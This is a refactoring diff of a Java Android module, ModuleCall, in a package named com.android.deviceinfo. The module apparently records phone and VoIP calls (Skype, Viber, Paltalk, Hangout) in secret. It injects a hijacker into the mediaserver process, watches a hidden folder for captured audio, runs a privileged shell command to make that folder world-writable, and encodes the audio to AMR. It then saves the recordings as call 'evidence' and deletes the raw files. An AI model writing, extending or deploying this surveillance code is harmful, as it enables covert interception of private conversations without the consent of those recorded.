@@ -9,15 +9,11 @@
 
 package com.android.deviceinfo.module;
 
-import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.FilenameFilter;
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.util.Date;
@@ -27,7 +23,6 @@ import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
 
-import android.media.AmrInputStream;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.FileObserver;
@@ -47,6 +42,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.resample.Resample;
+import com.android.deviceinfo.util.AudioEncoding;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
@@ -82,13 +78,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final int AUDIO_STREAM_MUSIC      = 3;
 	private static final int AUDIO_STREAM_MIC		 = -2; // Defined by us, not by Android
 
-	private String audioStorage;
 	private FileObserver observer;
 	private Thread queueMonitor;
 	private static final Object sync = new Object();
 	private static BlockingQueue<String> calls;
 	private EncodingTask encodingTask;
-	private String audioDirectory = "k0/";
 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
@@ -131,7 +125,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		boolean audioStorageOk = false;
 
 		for (int i = 0; i < 5; i++) {
-			if (createAudioStorage() == true) {
+			if (AudioEncoding.createAudioStorage() == true) {
 				audioStorageOk = true;
 				break;
 			}
@@ -154,7 +148,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + "(actualStart): starting audio storage management");
 			}
 			
-			Instrument hijack = new Instrument("mediaserver", audioStorage);
+			Instrument hijack = new Instrument("mediaserver", AudioEncoding.getAudioStorage());
 			
 			if (hijack.installHijacker()) {
 				if (Cfg.DEBUG) {
@@ -197,7 +191,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			// Observe our audio storage (events are filtered so if you push a .tmp using ADB it wont
 			// trigger, you have to copy the test file and RENAME it .tmp to trigger this observer)
-			observer = new FileObserver(audioStorage, FileObserver.MOVED_TO) {
+			observer = new FileObserver(AudioEncoding.getAudioStorage(), FileObserver.MOVED_TO) {
 				@Override
 				public void onEvent(int event, String file) {
 					if (Cfg.DEBUG) {
@@ -205,7 +199,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					}
 					
 					// Add to list
-					if (addToEncodingList(audioStorage + file) == true) {
+					if (addToEncodingList(AudioEncoding.getAudioStorage() + file) == true) {
 						synchronized(sync) {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + "(onEvent): signaling EncodingTask thread");
@@ -223,7 +217,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private void purgeAudio() {
 		// Scrub for existing files on FS
-		File f = new File(audioStorage);
+		File f = new File(AudioEncoding.getAudioStorage());
 		
 		FilenameFilter filter = new FilenameFilter() {
 		    public boolean accept(File dir, String name) {
@@ -258,7 +252,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	
 	private void scrubAudio() {
 		// Scrub for existing files on FS
-		File f = new File(audioStorage);
+		File f = new File(AudioEncoding.getAudioStorage());
 		
 		FilenameFilter filter = new FilenameFilter() {
 		    public boolean accept(File dir, String name) {
@@ -938,7 +932,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			return string.length() * 2 + 4;
 		}
 	}
-
+	
 	// start: call start date
 	// sec_length: call length in seconds
 	// type: call type (Skype, Viber, Paltalk, Hangout)
@@ -946,7 +940,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		int end_of_call = 0xF00DF00D;
 		int epoch, streamType, sampleRate = 44100, blockLen;
 		int discard_frame_size = 8;
-		
+
 		// header format - each field is 4 bytes le :
 		// epoch : streamType : sampleRate : blockLen
 		File raw = new File(f);
@@ -955,25 +949,25 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		try {
 			in = new FileInputStream(raw);
-			
+
 			byte data[] = new byte[(int)raw.length()];
 			in.read(data, 0, (int)raw.length());
-			
+
 			ByteBuffer d = ByteBuffer.wrap(data);
 			d.order(ByteOrder.LITTLE_ENDIAN);
-			
+
 			data = null;
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(encodeChunks): Parsing " + f);
 			}
-			
+
 			int data_size = 0, last_epoch = 0, first_epoch = 0;
-			
+
 			// First round calculates the bitrate and real size of audio data
 			while (d.remaining() > 0) {
 				int cur_epoch = d.getInt();
-				
+
 				d.position(d.position() + 8); // Discard streamType and sampleRate
 				blockLen = d.getInt();
 
@@ -982,36 +976,36 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					if (first_epoch == 0) {
 						first_epoch = cur_epoch;
 					}
-					
+
 					data_size += blockLen; // Get blockLen
 					last_epoch = cur_epoch;
 				}
-				
+
 				if (Cfg.DEBUG) {
 					//Check.log(TAG + "(encodeChunks): blockLen: " + blockLen + " remaining: " + d.remaining() + " current position: " + d.position() + " next position: " + (d.position() + blockLen));
 				}
-				
+
 				d.position(d.position() + blockLen);
 			}
-			
+
 			// Let's start again
 			d.rewind();
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(encodeChunks): raw data size: " + data_size + " bytes, file length: " + (last_epoch - first_epoch) + " seconds");
 			}
-			
+
 			byte[] rawPcm = new byte[data_size];
 			int pos = 0;
 			boolean call_finished = false;
-			
+
 			// Second round extracts only the audio data
 			while (d.remaining() > 0) {
 				epoch = d.getInt();
 				streamType = d.getInt();
 				sampleRate = d.getInt();
 				blockLen = d.getInt();
-				
+
 				if (Cfg.DEBUG) {
 					//Check.log(TAG + "(encodeChunks): epoch: " + epoch + " streamType: " + streamType + " sampleRate: " + sampleRate + " blockLen: " + blockLen);
 				}
@@ -1031,167 +1025,77 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 					continue;
 				}
-				
+
 				if (blockLen == discard_frame_size) {
 					if (Cfg.DEBUG) {
 						//Check.log(TAG + "(encodeChunks): skipping misterious frame (length: " + blockLen + " bytes)");
 					}
-					
+
 					d.position(d.position() + blockLen);
 					continue;
 				}
-				
+
 				byte[] rawPcmBlock = new byte[blockLen];
 				d.get(rawPcmBlock);
-				
+
 				System.arraycopy(rawPcmBlock, 0, rawPcm, pos, rawPcmBlock.length);
 				pos += blockLen;
 			}
-			
-			int bitRate = getBitrate(last_epoch - first_epoch, data_size);
-			
+
+			int bitRate = AudioEncoding.getBitrate(last_epoch - first_epoch, data_size);
+
 			// Ideally the sample rate should be the same for every chunk... Ideally...
 			if (bitRate < 0) {
 				// Borderline case in which we are unable to infer the real value
 				bitRate = sampleRate;
 			}
-			
+
 			WaveHeader header = Resample.createHeader(bitRate, rawPcm.length);
-			
+
 			// Resample audio
 			Wave wave = Resample.resampleRaw(header, rawPcm);
-			
+
 			// Now rawPcm contains the raw data
 			String encodedFile = f + ".err";
-			
-			if (encodetoAmr(encodedFile, wave.getBytes())) {
+
+			if (AudioEncoding.encodetoAmr(encodedFile, wave.getBytes())) {
 				Date begin = new Date(first_epoch * 1000L);
 				Date end = new Date(last_epoch * 1000L);
-				
+
 				int remote;
-				
+
 				if (encodedFile.endsWith("-r.tmp.err")) {
 					remote = 1;
 				} else {
 					remote = 0;
 				}
-				
+
 				// Encode to evidence
 				saveCallEvidence("+666", true, begin, end, encodedFile, false, remote);
-				
+
 				// We have an end of call and it's on both channels
 				if (call_finished) {
 					// After encoding create the end of call marker
 					closeCallEvidence("+666", true, begin, end);
-					
+
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(encodeChunks): end of call reached");
 					}
 				}	
 			}
-			
+
 			// Remove file
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(encodeChunks): deleting " +  f);
 			}
-			
+
 			raw.delete();
 		} finally {
 			if (in != null) {
 				in.close();
 			}
 		}
-		
+
 		return true;
-	}
-
-	private boolean encodetoAmr(String outFile, byte[] raw) {
-	    File file = new File(outFile);
-	    
-	    try {		
-	    	InputStream inStream = new ByteArrayInputStream(raw);
-	    	AmrInputStream aStream = new AmrInputStream(inStream);
-	    	
-	    	file.createNewFile();
-			
-		    OutputStream out = new FileOutputStream(file); 
-			
-		    out.write(0x23);
-		    out.write(0x21);
-		    out.write(0x41);
-		    out.write(0x4D);
-		    out.write(0x52);
-		    out.write(0x0A);    
-		
-		    byte[] buf = new byte[4096];
-		    int len;
-		    
-		    while ((len = aStream.read(buf)) > 0) {
-		        out.write(buf, 0, len);
-		    }
-		
-		    out.close();
-		    aStream.close();
-		} catch (Exception e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-			
-			return false;
-		}
-	    
-	    return true;
-	}
-
-	private boolean createAudioStorage() {
-		// Create storage directory
-		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;
-
-		if (Path.createDirectory(audioStorage) == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (createAudioStorage): audio storage directory cannot be created"); //$NON-NLS-1$
-			}
-
-			return false;
-		} else {
-			Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "777" + " " + audioStorage);
-			
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (createAudioStorage): audio storage directory created at " + audioStorage); //$NON-NLS-1$
-			}
-
-			return true;
-		}
-	}
-	
-	private int getBitrate(int delta, int data_size) {
-		float min = Float.MAX_VALUE;
-		int bitrates[] = {8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 176400, 192000, 352800, 384000};
-		int calc = -1;
-		
-		if (delta <= 0 || data_size <= 0) {
-			return -1;
-		}
-		
-		int bitrate = (data_size / 2) / delta; // 16-bit PCM
-		
-		// Calculate the closest possible real value, yep it can be optimized:
-		// if t > min: return prev_bitrate
-		for (int b : bitrates) {
-			float t = (float)bitrate / (float)b;
-			
-			t = Math.abs(1.0f - t);
-			
-			if (t < min) {
-				calc = b;
-				min = t;
-			}
-		}
-		
-		if (Cfg.DEBUG) {
-			Check.log(TAG + "(getBitrate): bitrate declared: " + bitrate + " bitrate inferred: " + calc);
-		}
-		
-		return calc;
 	}
 }
